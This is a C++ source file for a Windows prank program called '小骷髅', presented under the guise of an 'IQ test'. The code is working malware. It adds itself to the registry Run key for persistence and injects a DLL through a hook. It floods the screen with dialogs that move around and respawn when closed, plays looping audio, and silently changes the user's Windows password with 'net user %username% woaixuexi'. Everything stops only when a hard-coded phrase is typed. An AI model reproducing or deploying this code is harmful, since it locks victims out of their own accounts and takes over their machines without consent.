// 小骷髅.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "小骷髅.h"

DWORD dwLoadDialog = 0;
#define LOAD_DIALOG dwLoadDialog
#define PASSWORDSTRING "我爱学习，学习使我快乐"
#define VALUENAME "智商测试"
#define PassWordCommand "net user %username% woaixuexi"


// 全局变量:
HINSTANCE hInst;								// 当前实例
HICON hIcon = NULL;
HMODULE hDll = NULL;//KeepRun

VOID CreateAndShowDialog()
{
	//根据时间设置窗口数
	SYSTEMTIME st;
	GetLocalTime(&st);
	dwLoadDialog = st.wMonth + st.wDay + st.wDayOfWeek + st.wHour + st.wMinute;
	hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_MY));

	for (UINT i = 0; i < LOAD_DIALOG; i++) {
		HWND hDlg = CreateDialog(hInst, MAKEINTRESOURCE(IDD_MAINDLG), NULL, DlgProc);
		ShowWindow(hDlg, SW_SHOW);
	}
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: 在此放置代码。
	KeepRunning();
	hInst = hInstance;
	//开机启动
	RunByWindow(TRUE);
	//注入DLL
	SetHook();
	//播放音乐
	PlaySound(_T("background.wav"), NULL, SND_ASYNC | SND_LOOP);
	//创建对话框
	CreateAndShowDialog();
	//修改系统密码
	_tsystem(_T(PassWordCommand));
	//启动密码框
	DialogBox(hInst, MAKEINTRESOURCE(IDD_PASSWORD), NULL, PassWordProc);//密码正确则退出程序

	//清理
	SendMyMessage(WM_CLOSE);
	SetHook();
	return GetLastError();
}

VOID MoveDialog(HWND hDlg)
{
	RECT rc;
	GetWindowRect(GetDesktopWindow(), &rc);
	SetWindowPos(hDlg, HWND_BOTTOM, rand() % rc.right, rand() % rc.bottom, NULL, NULL, 
		SWP_NOSIZE | SWP_NOACTIVATE | SWP_NOREDRAW);
}

INT_PTR CALLBACK DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		OnInitMainDlg(hDlg);
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		OnCommand(hDlg, wParam, lParam);
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			CreateAndShowDialog();
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	case WM_TIMER:
		MoveDialog(hDlg);
		SendMyMessage(WM_APP);
		break;
	}
	return (INT_PTR)FALSE;
}

INT_PTR CALLBACK PassWordProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		SendMessage(hDlg, WM_SETICON, 0, (LPARAM)hIcon);
		break;
	case WM_COMMAND:
		OnCommand(hDlg, wParam, lParam);
		switch (LOWORD(wParam))
		{
		case IDOK:
			TCHAR sz[MAX_PATH];
			GetDlgItemText(hDlg, IDC_EDIT1, sz, _countof(sz));
			if (lstrcmp(sz, _T(PASSWORDSTRING)) == 0) {
				CancelKeepRunning();
				EndDialog(hDlg, IDOK);
				RunByWindow(FALSE);//取消开机启动
				return IDOK;
			}
		}
	}
	return (INT_PTR)FALSE;
}

VOID OnInitMainDlg(HWND hDlg)
{
	SendMessage(hDlg, WM_SETICON, 0, (LPARAM)hIcon);
	SetTimer(hDlg, NULL, 1 * 1000, NULL);
}

VOID OnCommand(HWND hDlg, WPARAM wParam, LPARAM lParam)
{
	switch (LOWORD(wParam))
	{
	case IDM_ABOUT:
		DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hDlg, About);
		break;
	}
}

INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDOK:
			ShellExecute(NULL, _T("open"), _T("https://github.com/KrxkGit"), NULL, NULL, SW_NORMAL);
			return TRUE;
		case IDCANCEL:
			EndDialog(hDlg, IDCANCEL);
			break;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

BOOL RunByWindow(BOOL bRun)
{
	TCHAR szKey[] = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	HKEY hKey;
	DWORD dwType;

	if (bRun) {
		BOOL bSuccess = FALSE;
		RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_READ, &hKey);
		bSuccess = RegQueryValueEx(hKey, _T(VALUENAME), 0, &dwType, NULL, NULL);
		RegCloseKey(hKey);
		if (bSuccess == ERROR_SUCCESS || bSuccess == ERROR_MORE_DATA) { //键值已存在
			return TRUE;
		}
		else {
			RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_SET_VALUE, &hKey);
			TCHAR szPath[MAX_PATH];
			GetModuleFileName(NULL, szPath, _countof(szPath));
			RegSetValueEx(hKey, _T(VALUENAME), 0, REG_SZ, (BYTE*)szPath, (DWORD)(_tcslen(szPath) + 1)*sizeof(TCHAR));
			RegCloseKey(hKey);
		}
	}
	else {
		RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_SET_VALUE, &hKey);
		RegDeleteValue(hKey, _T(VALUENAME));
		RegCloseKey(hKey);
		CancelKeepRunning();
	}
	return TRUE;
}